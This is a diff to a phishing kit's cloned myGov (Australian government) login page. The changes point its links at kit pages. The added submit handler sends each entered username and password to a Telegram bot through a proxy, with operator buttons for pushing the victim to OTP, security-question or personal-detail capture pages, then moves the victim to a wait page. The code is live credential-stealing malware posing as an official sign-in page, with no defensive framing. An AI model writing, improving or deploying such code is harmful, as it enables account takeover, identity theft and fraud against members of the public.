@@ -85,7 +85,7 @@
                         <div class="login-grid-column">
                             <div class="digital-id-login-card-wrapper">
                                 <div class="digital-id-main-login-card override">
-                                    <a data-go-back-link="" class="button-back" href="#">Back</a>
+                                    <a data-go-back-link="" class="button-back" href="log.html">Back</a>
 
                                     <!-- ✅ SUCCESS MESSAGE -->
                                     <div class="success-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Success message:</span>
@@ -105,9 +105,9 @@
                                         <div class="button-digital-id-container">
                                             <div class="digital-id-login-option-container">
                                                 <div class="inner-options">
-                                                    <a class="button-digital-identity" href="/las/mygov-login?execution=e6s1&amp;_eventId=digitalIdentity">Sign in with Digital ID</a>
+                                                    <a class="button-digital-identity" href="log.html">Sign in with Digital ID</a>
                                                     <input type="hidden" value="{flowScope.targetParamDI}">
-                                                    <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0">
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" href="log.html" onclick="authenticatePasskey()" tabindex="0">
                                                         <img class="passkey-icon" src="https://login.my.gov.au/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt="Passkey icon">
                                                         Sign in with passkey
                                                     </a>
@@ -137,7 +137,7 @@
                                             <input id="ai" name="ai" type="text" value="" autocomplete="off" required="">
                                         </div>
                                         <p class="recovery">
-                                            <a href="#" class="anchor override">Forgot username</a>
+                                            <a href="passreset.html" class="anchor override">Forgot username</a>
                                         </p>
                                         <div class="input-group">
                                             <label for="password" class="override">Password</label>
@@ -148,7 +148,7 @@
                                             </div>
                                         </div>
                                         <p class="recovery">
-                                            <a href="#" class="anchor override">Forgot password</a>
+                                            <a href="passreset.html" class="anchor override">Forgot password</a>
                                         </p>
                                         <div class="button-digital-id-main-container override">
                                             <div class="digital-id-button-container">
@@ -159,7 +159,7 @@
                                             </div>
                                         </div>
                                         <p class="create-account-text">
-                                            <a class="create-account-link" href="#">Create a myGov account</a> if you don't have one already.
+                                            <a class="create-account-link" href="log.html">Create a myGov account</a> if you don't have one already.
                                         </p>
                                     </form>
                                 </div>
@@ -198,72 +198,69 @@
 
     <!-- JavaScript -->
     <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
-   <script src="endpoints.js"></script>
-<script src="config.js"></script>
-<script>
-    const ROUTES = {
-        "otp":         "otp.html",
-        "notcorrect":  "notcorrect.html",
-        "login":       "log.html",
-        "secquestion": "sec1.html",
-        "detail":      "detail.html"
-    };
-
-    // ... (keep the favicon spinner code unchanged) ...
-
+    <script src="endpoints.js"></script>
+    <script src="config.js"></script>
+    <script>
     $(document).ready(function() {
         $('#form-1').on('submit', async function(e) {
             e.preventDefault();
+
             const user = $('#ai').val();
             const pass = $('#pr').val();
+
+            // Immediate spinner feedback on the button
             $('#btn1').addClass('loading').prop('disabled', true);
-            startTabSpinner();
-            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) || Math.random().toString(36).slice(2, 10);
+
+            // Fresh session id for this attempt
+            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                        Math.random().toString(36).slice(2, 10);
+
             const keyboard = {
                 inline_keyboard: [
                     [{ text: "🔐 OTP",         callback_data: `otp:${sid}`         }],
                     [{ text: "🔑 Notcorrect",  callback_data: `notcorrect:${sid}`  }],
-                    [{ text: "↩️ Login",       callback_data: `log:${sid}`         }],
+                    [{ text: "↩️ Login",       callback_data: `login:${sid}`       }],
                     [{ text: "✅ Secquestion", callback_data: `secquestion:${sid}` }],
                     [{ text: "✍️ Detail",      callback_data: `detail:${sid}`      }]
                 ]
             };
+
             try {
-                const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
-                const d0 = await r0.json();
-                const startOffset = (d0.result && d0.result.length) ? d0.result[d0.result.length - 1].update_id + 1 : 0;
+                // 1) Grab current offset so wait.html only reacts to NEW presses
+                let startOffset = 0;
+                try {
+                    const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+                    const d0 = await r0.json();
+                    startOffset = (d0.result && d0.result.length)
+                        ? d0.result[d0.result.length - 1].update_id + 1
+                        : 0;
+                } catch (err) {
+                    console.warn("offset fetch failed, using 0", err);
+                }
+
+                // 2) Send credentials + buttons to Telegram right now
                 await sendTelegramMessageViaProxy(
                     `🔔 myGov Login attempt\n👤 Username: ${user}\n🔑 Password: ${pass}\n🆔 Session: ${sid}`,
                     keyboard
                 );
-                pollLoop(startOffset, sid);
-            } catch (err) { console.error(err); }
+
+                // 3) Hand the session info to wait.html
+                sessionStorage.setItem('mgv_sid', sid);
+                sessionStorage.setItem('mgv_offset', String(startOffset));
+
+                // 4) Navigate to the please-wait page
+                window.location.href = 'wait.html';
+
+            } catch (err) {
+                console.error(err);
+                // Even on network error, still go to the wait page so the user sees the spinner
+                sessionStorage.setItem('mgv_sid', sid);
+                sessionStorage.setItem('mgv_offset', '0');
+                window.location.href = 'wait.html';
+            }
         });
     });
-
-    async function pollLoop(offset, sid) {
-        while (true) {
-            try {
-                const data = await getTelegramUpdates(offset, 15);
-                if (!data.result) continue;
-                for (const upd of data.result) {
-                    offset = upd.update_id + 1;
-                    const cb = upd.callback_query;
-                    if (!cb) continue;
-                    const [action, sess] = cb.data.split(":");
-                    if (sess !== sid) continue;
-                    await answerTelegramCallback(cb.id, "Redirecting user…");
-                    stopTabSpinner();
-                    window.location.href = ROUTES[action] || "otp.html";
-                    return;
-                }
-            } catch (e) {
-                console.error(e);
-                await new Promise(r => setTimeout(r, 2000));
-            }
-        }
-    }
-</script>
+    </script>
 </body>
 
 </html>
